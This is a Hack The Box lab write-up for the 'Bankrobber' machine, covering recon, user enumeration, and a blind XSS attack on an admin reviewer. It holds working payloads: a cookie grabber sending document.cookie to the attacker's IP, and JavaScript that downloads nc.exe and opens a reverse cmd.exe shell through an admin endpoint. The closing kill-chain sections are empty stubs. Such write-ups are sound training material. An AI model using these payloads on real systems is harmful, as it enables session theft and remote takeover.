
# Bankrobber
 
[Home](index.md) / Bankrobber - Hack The Box

<img src="img/card.jpeg" width="40%">

****

This was my first active box on HTB that I was able to root, and it's rated at insane difficulty. So I thought this would be a great place to start my first write-up. This being a box I solved almost 6 months ago, bare with me as I try to remember exactly what I did based on scatterd notes I jotted down. I am not writting this like a traditional Pentest report to a client but from the perspective of a teacher speaking to a student and will attempt to recapture my thought proccess so you can understand the flow.

I liked this box a lot because it consisted of web vulnerabilities that I already knew how to find and exploit and emulated a realistic Pentest. 

The only issue I had was this box required a bot to impersonate an admin's session and the response time for this was just not there, which was a major detour, almost to the point that I gave up. After I climbed that wall, I was able to get initial foothold and eventually rooted within a few days.

----

### Synopsis

Bankrobber is a web app box that can be solved with some essential OWASP top 10 knowledge to get a user shell, and some basic binary exploitation to esculate to root.

----

### Reconnaissance

Well, before any PT, you first must know what is the scope of the engagement. What do we already know, what must we find out. We know that this is a Windows host from the description card and HTB provided the IP address of our target. So we turn to `Nmap` a faithful and reliable tool that is almost as old as the internet itself. Then initiate a scan and probe all common TCP ports to discover some services to test.
```bash
# nmap -e tun0 -n -v -Pn -p80,443,445,3306 -A --reason -oN nmap.txt 10.10.10.154
...
PORT     STATE SERVICE      REASON          VERSION
80/tcp   open  http?        syn-ack ttl 127
| http-methods:
|_  Supported Methods: GET HEAD POST
|_http-title: E-coin
443/tcp  open  ssl/http     syn-ack ttl 127 Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4)
| http-methods:
|_  Supported Methods: GET HEAD POST
|_http-title: E-coin
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4 4cc9 9e84 b26f 9e63 9f9e d229 dee0
|_SHA-1: b023 8c54 7a90 5bfa 119c 4e8b acca eacf 3649 1ff6
445/tcp  open  microsoft-ds syn-ack ttl 127 Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3306/tcp open  mysql        syn-ack ttl 127 MariaDB (unauthorized)
```
We see here that HTTP/s web services are available at standard ports 80 and 443, an MYSQL database on standard 3306 as well as an open port on 445 standard SMB which is another way to determine the likeliness this is a Windows machine.



Since the name of the challenge is BankRobber, I think it is pretty safe to assume there is a bank involved.

Before looking at the network stack I always begin with the application layer. So I load up my HTTP proxy/sniffer/injector/fuzzer Burp Suite, the swiss army knife of HTTP testing and surf over to the web site to have a look-see at this Bank's applications and see what she is made of.

So we see here that this is some kind of BitCoin operation. Let's learn more...
![](img/recon.png)

### Web Enumeration
We see that this is a site for users to buy and sell E-Coin cryptocurrency.
There is a LOGIN and Register link in the top right head of the page.
We can Register a account and login to discover a mechanism for transfering funds from account to account and a text field to leave a comment.

#### Directory/File Enumeration

First I spider with Burp to crawl the site and build a map.

![](img/sitemap.png)

While in my terminal I run `Gobuster` with `Seclists` because I wanted to compare/contrast the difference.
```bash
# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt -t 40 -x php,txt,log -u http://10.10.10.154/
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.154/
[+] Threads:        40
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt,log
[+] Timeout:        10s
===============================================================
2019/09/24 02:34:03 Starting gobuster
===============================================================
/login.php (Status: 302)
/user (Status: 301)
/admin (Status: 301)
/js (Status: 301)
/logout.php (Status: 302)
/css (Status: 301)
/register.php (Status: 200)
/img (Status: 301)
/webalizer (Status: 403)
/index.php (Status: 200)
/fonts (Status: 301)
/phpmyadmin (Status: 403)
/link.php (Status: 200)
/notes.txt (Status: 200)
/licenses (Status: 403)
/server-status (Status: 403)
/con (Status: 403)
/con.php (Status: 403)
/con.txt (Status: 403)
/con.log (Status: 403)
Progress: 8536 / 17771 (48.03%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2019/09/24 02:41:33 Finished
===============================================================
```
`login.php` and `register.php` both have a input fields and I make a note to test later.

The `/admin` dir is not accessible, session managment and authorization will be tested.

`notes.txt` provided some useful Dev notes left behind possibly for later.

![](img/notes.png)

let's do a quick HTTP packet header analysis of the `.php` files with `curl`

`login.php`

```bash
$curl -i -d "username=admin&password=admin" http://10.10.10.154/login.php
HTTP/1.1 302 Found
Date: Thu, 19 Mar 2020 08:07:28 GMT
Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4
X-Powered-By: PHP/7.3.4
Location: index.php
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```
`register.php`

```bash
# $curl -i -d "username=admin&password=admin" http://10.10.10.154/register.php
HTTP/1.1 302 Found
Date: Thu, 19 Mar 2020 08:06:55 GMT
Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4
X-Powered-By: PHP/7.3.4
Location: index.php?msg=User already exists.
Content-Length: 0
Content-Type: text/html; charset=UTF-8

```
We can now see that users can be enumerated by `msg=User already exist` 
and we identifed an account with the username `admin` 

let's see what happens if we create a user that dosn't exist.
```bash
$curl -i -d "username=mother&password=goose" http://10.10.10.154/register.php
HTTP/1.1 302 Found
Date: Thu, 19 Mar 2020 08:05:28 GMT
Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4
X-Powered-By: PHP/7.3.4
Location: index.php?msg=User created.
Content-Length: 0
Content-Type: text/html; charset=UTF-8

```

Ok that seemed to work, now let's try to login with our fresh account.
```bash
 $curl -i -d "username=mother&password=goose" http://10.10.10.154/login.php
HTTP/1.1 302 Found
Date: Thu, 19 Mar 2020 08:08:39 GMT
Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4
X-Powered-By: PHP/7.3.4
Set-Cookie: id=25
Set-Cookie: username=bW90aGVy
Set-Cookie: password=Z29vc2U%3D
Location: user
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```
The response headers here tells us a lot of useful information about the authentication mechanisms in place.

`Location: user` indicates redirection to the `/user` dir 
we can assume admin should get redirected to `/admin`

cookie-based authentication:
`Set-Cookie: id=25` tells us it's likely there are 25 other accounts 
`id=1` or `0` is probably the admin.

The username and password values are base64 and url-encoded.

We can try a few basic passwords to attempt to login as admin but fail.
There is no lockout mechnaisms for attempts made.
This sets the stage if all else fails for a Brute Force attack
but I was feeling BF is a bit too much Script Kiddie like for an insane box, 


So now I switch over to Burp and Browser and head over to `login.php` and log back in with our account and attempt to transfer some funds.

![transfer](img/transfer.png)

Once I submit the transfer I get prompted a JS alert stating that the `admin` will review our input in a minute. This is a critical clue and enough for us to formulate an attack. 

![alert](img/alert.png)

After our examination, we know that the session tokens are static credentials and the transfers are done in javascript. This is a indication of a possible blind XSS vulnerability where when the `admin` reviews our input, he will execute our malicious script. Which will reflect his session cookies back to our C2. 

We might be able to utilize this to reflect and execute a .js stored on our own C2 host to drop and execute a payload. Which can give us a shell.


So now that we formulated our devious masterplan, lets build the tools we need to perform.

### Weaponization
Here we build a simple XSS to drop in the comment box in `transfer.php`

XSS Cookie grabber - gets the session token of the admin and reflects it back to us through the url
```javascript
<script>var i=new Image;i.src="http://10.10.14.5/?"+document.cookie;</script>
```

XSS payload
```javascript
//XSS To drop nc.exe:
<script src=http://10.10.14.5/payd.js%3E</script>

//XSS to Reverse Shell:
<script src=http://10.10.14.5/pay.js%3E</script>
```

Dropper

`payd.js`
```javascript
function paintfunc(){
    var http = new XMLHttpRequest();
        var url = 'http://localhost/admin/backdoorchecker.php';
        var params = 'cmd=dir | powershell -c Invoke-WebRequest -Uri "http://10.10.14.5/nc.exe" -OutFile "C:\\windows\\system32\\spool\\drivers\\color\\nc.exe"';
        http.open('POST', url, true);
        http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
        http.send(params);
}

paintfunc();
```

Execution

`pay.js`
```javascript
function paintfunc(){
    var http = new XMLHttpRequest();
        var url = 'http://localhost/admin/backdoorchecker.php';
        var params = 'cmd=dir | powershell -c "C:\\windows\\system32\\spool\\drivers\\color\\nc.exe" -e cmd.exe 10.10.14.5 4444';
        http.open('POST', url, true);
        http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
        http.send(params);
}

paintfunc();
```


### Delivery

So from my localbox terminal I use a python module called http.server (used to be simpleHTTPserver)
```bash
$python -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```


### Exploitation
The malware begins executing on the target system

### Installation
The malware installs a backdoor or other ingress accessible to the attacker

### Command and Control
The intruder gains persistent access to the victimâ€™s systems/network

### Actions on Objective
Intruder initiates end goal actions, such as data theft, data corruption, or data destruction
